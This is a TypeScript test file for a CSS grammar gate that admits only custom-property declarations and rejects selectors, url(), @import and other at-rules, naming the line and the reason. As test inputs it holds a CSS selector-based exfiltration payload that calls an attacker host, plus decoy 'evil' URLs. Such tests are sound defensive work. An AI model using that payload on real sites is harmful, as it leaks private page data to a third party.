// R3-316's grammar gate, adversarially: every forbidden shape is rejected AND
// NAMED; comment- and string-hidden attempts do not change the verdict; clean
// declarations pass with their quoted values intact.
import { describe, it, expect } from 'vitest';
import { gateStylesheet, blankCssNoise } from './contentStylesheet';

describe('clean sheets pass', () => {
  it('declarations-only CSS is admitted, quoted values intact', () => {
    const v = gateStylesheet('--bg: #101010;\n--font-body: "Lora", serif;\n');
    expect(v.ok).toBe(true);
    if (v.ok) expect(v.declarations).toContain('"Lora", serif');
  });

  it('comments are allowed (and carry no verdict)', () => {
    const v = gateStylesheet('/* a note */\n--bg: #101010;\n');
    expect(v.ok).toBe(true);
  });
});

describe('the forbidden shapes are rejected and NAMED', () => {
  const cases: Array<[string, string, RegExp]> = [
    ['a selector', '.sidebar { display: none; }', /selector/],
    ['url(', '--wash: url(paper.jpg);', /url\(/],
    ['@import', '@import url(evil.css);', /@import/],
    ['@font-face', '@font-face { src: url(a.woff2); }', /@font-face/],
    ['@layer', '@layer grove.content { }', /layer/],
    ['a bare property (not a custom prop)', 'color: red;', /custom-property/],
    ['a media at-rule', '@media (min-width: 600px) { }', /at-rules/],
  ];
  for (const [name, css, reasonRe] of cases) {
    it(`${name} → rejected, line named, excerpt quoted`, () => {
      const v = gateStylesheet(`--ok: 1;\n${css}\n--ok2: 2;\n`);
      expect(v.ok).toBe(false);
      if (!v.ok) {
        expect(v.line).toBe(2);
        expect(v.reason).toMatch(reasonRe);
        expect(v.excerpt.length).toBeGreaterThan(0);
      }
    });
  }
});

describe('hidden attempts do not change the verdict (the blanking rule)', () => {
  it('a url( inside a COMMENT is ignored — the comment carries no semantics', () => {
    expect(gateStylesheet('/* url(nothing-here) */\n--bg: #101010;\n').ok).toBe(true);
  });

  it('a REAL url( after a decoy comment is still caught', () => {
    const v = gateStylesheet('/* url(decoy) */\n--wash: url(real-evil.jpg);\n');
    expect(v.ok).toBe(false);
    if (!v.ok) expect(v.line).toBe(2);
  });

  it('a selector-shaped STRING inside a declaration is inert data, not a rule — admitted', () => {
    // String CONTENTS are blanked for the scan (so nothing inside a string can
    // smuggle a verdict-changing token) and the line remains a well-formed
    // declaration; a custom property never re-interprets its value as a rule.
    const v = gateStylesheet(`--note: "{ display: none; }";\n`);
    expect(v.ok).toBe(true);
    if (v.ok) expect(v.declarations).toContain('--note:');
  });

  it('blankCssNoise preserves offsets (line numbers stay true)', () => {
    const src = 'a { /* comment\nspanning lines */ }';
    const blanked = blankCssNoise(src);
    expect(blanked.indexOf('comment')).toBe(-1);
    expect(blanked.length).toBe(src.length);
  });
});

describe('the existence-oracle payload — the attack the grammar exists for', () => {
  it('the canonical exfiltration attempt is rejected by name', () => {
    const attack = `a[href^="/content/salary-"] { background-image: url("https://attacker/?hit"); }`;
    const v = gateStylesheet(attack);
    expect(v.ok).toBe(false);
    // Either catch is a correct rejection: the url( (the exfil channel) or the
    // selector (the reach). Both are named, line-accurate verdicts.
    if (!v.ok) expect(v.reason).toMatch(/selector|url\(/);
  });
});
